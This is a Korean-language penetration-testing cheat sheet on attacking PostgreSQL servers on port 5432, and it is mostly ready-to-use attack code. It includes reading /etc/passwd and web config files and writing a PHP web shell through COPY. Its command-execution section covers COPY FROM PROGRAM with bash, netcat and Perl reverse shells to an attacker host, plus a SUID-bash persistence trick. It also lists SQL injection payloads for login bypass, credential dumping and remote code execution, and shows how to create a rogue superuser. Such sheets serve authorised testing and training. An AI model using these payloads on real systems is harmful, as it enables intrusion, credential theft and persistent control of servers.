---
sidebar_position: 5
---

# PostgreSQL - 5432

PostgreSQL 데이터베이스 연결 및 공격 기법 모음입니다.

## 연결 방법

### psql 클라이언트

```bash
# 기본 연결
psql

# 원격 연결
psql -h <RHOST> -U <USERNAME>
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>

# 비밀번호와 함께
psql -h <RHOST> -U <USERNAME> -W

# 명령 실행
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
```

### 환경 변수 사용

```bash
export PGPASSWORD='password'
psql -h <RHOST> -U <USERNAME>
```

## 기본 명령어

### 메타 명령어

```sql
\?                      -- 도움말
\l                      -- 데이터베이스 목록
\list                   -- 데이터베이스 목록 (상세)
\c                      -- 현재 데이터베이스
\c <DATABASE>           -- 데이터베이스 전환
\dt                     -- 현재 스키마의 테이블 목록
\dt *.*                 -- 모든 스키마의 테이블 목록
\d <TABLE>              -- 테이블 구조 확인
\du                     -- 사용자 역할 목록
\du+                    -- 사용자 역할 상세 정보
\s                      -- 명령 히스토리
\q                      -- 종료
\!                      -- 쉘 명령 실행
```

### 정보 확인

```sql
SELECT version();
SELECT current_user;
SELECT user;
SELECT current_database();
SELECT session_user;
SELECT inet_server_addr();
SELECT inet_server_port();
```

### 데이터베이스 및 테이블

```sql
-- 데이터베이스 목록
SELECT datname FROM pg_database;

-- 현재 스키마의 테이블
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- 모든 테이블
SELECT schemaname,tablename FROM pg_tables;

-- 테이블 내용 보기
TABLE <TABLE>;
SELECT * FROM <TABLE>;
```

### 사용자 및 권한

```sql
-- 사용자 목록
SELECT usename FROM pg_user;
SELECT usename, passwd FROM pg_shadow;

-- 권한 확인
SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='<TABLE>';
```

## 파일 시스템 접근

### 디렉토리 읽기

```sql
SELECT * FROM pg_ls_dir('/');
SELECT * FROM pg_ls_dir('/etc');
SELECT * FROM pg_ls_dir('/var/www/html');
```

### 파일 읽기

```sql
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/passwd', 0, 1000000);
SELECT pg_read_file('/var/www/html/config.php', 0, 1000000);
```

### 파일 쓰기 (COPY)

```sql
COPY (SELECT 'test content') TO '/tmp/test.txt';
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

## 원격 코드 실행 (RCE)

### COPY를 통한 RCE

#### 방법 1: 간단한 명령 실행

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;
```

#### 방법 2: Reverse Shell

```sql
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"';
```

```sql
COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';
```

#### 방법 3: Perl Reverse Shell

```sql
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

#### 방법 4: SUID Bash

```sql
COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';
```

## SQL Injection 예제

### 인증 우회

```sql
' or 1=1--
admin' or '1'='1'--
' or '1'='1'-- -
```

### UNION 기반 Injection

#### 컬럼 수 찾기

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

#### 버전 확인

```sql
' UNION SELECT null,version(),null--
' UNION SELECT version(),null--
```

#### 현재 사용자

```sql
' UNION SELECT null,current_user,null--
' UNION SELECT user,null--
```

#### 데이터베이스 이름

```sql
' UNION SELECT null,current_database(),null--
```

#### 테이블 이름 열거

```sql
' UNION SELECT null,string_agg(tablename,','),null FROM pg_tables WHERE schemaname='public'--
```

#### 컬럼 이름 열거

```sql
' UNION SELECT null,string_agg(column_name,','),null FROM information_schema.columns WHERE table_name='<TABLE>'--
```

#### 데이터 덤프

```sql
' UNION SELECT null,string_agg(username||':'||password,','),null FROM users--
```

### 파일 읽기 (Injection)

```sql
'; SELECT pg_read_file('/etc/passwd',0,1000000)--
' UNION SELECT null,pg_read_file('/etc/passwd',0,1000000),null--
```

### RCE (Injection)

```sql
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"'--
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec--
```

### Time-Based Blind Injection

```sql
'; SELECT pg_sleep(5)--
' AND (SELECT 1 FROM pg_sleep(5))--
```

### Boolean-Based Blind Injection

```sql
' AND 1=1--  (True)
' AND 1=2--  (False)
' AND (SELECT current_user)='postgres'--
```

## 데이터 조작

### 비밀번호 변경

```sql
ALTER USER <USERNAME> WITH PASSWORD 'newpassword';
ALTER USER postgres WITH PASSWORD 'password123';
```

### 사용자 생성

```sql
CREATE USER hacker WITH PASSWORD 'password';
GRANT ALL PRIVILEGES ON DATABASE <DATABASE> TO hacker;
ALTER USER hacker WITH SUPERUSER;
```

## 확장 및 언어

### 사용 가능한 언어 확인

```sql
SELECT lanname FROM pg_language;
```

### 확장 목록

```sql
SELECT * FROM pg_available_extensions;
SELECT extname FROM pg_extension;
```

## 로그 및 설정

### 설정 확인

```sql
SHOW ALL;
SHOW data_directory;
SHOW config_file;
SHOW hba_file;
SELECT name, setting FROM pg_settings;
```

### 로그 위치

```sql
SELECT pg_current_logfile();
SHOW log_directory;
SHOW log_filename;
```

## 백업 및 복구

### 백업

```bash
pg_dump <DATABASE> > backup.sql
pg_dump -h <RHOST> -U <USERNAME> <DATABASE> > backup.sql
pg_dumpall > all_backup.sql
```

### 복구

```bash
psql <DATABASE> < backup.sql
psql -h <RHOST> -U <USERNAME> <DATABASE> < backup.sql
```

## 참고

- PostgreSQL은 기본적으로 5432 포트 사용
- COPY FROM PROGRAM은 슈퍼유저 권한 필요
- pg_read_file()은 PostgreSQL 9.1+ 에서 사용 가능
- RCE는 보통 postgresql 유저로 실행됨
- `pg_hba.conf` 파일이 인증 방식 제어
- SQL Injection 시 `--` 주석 사용
- `string_agg()`는 GROUP_CONCAT과 유사 (PostgreSQL 9.0+)
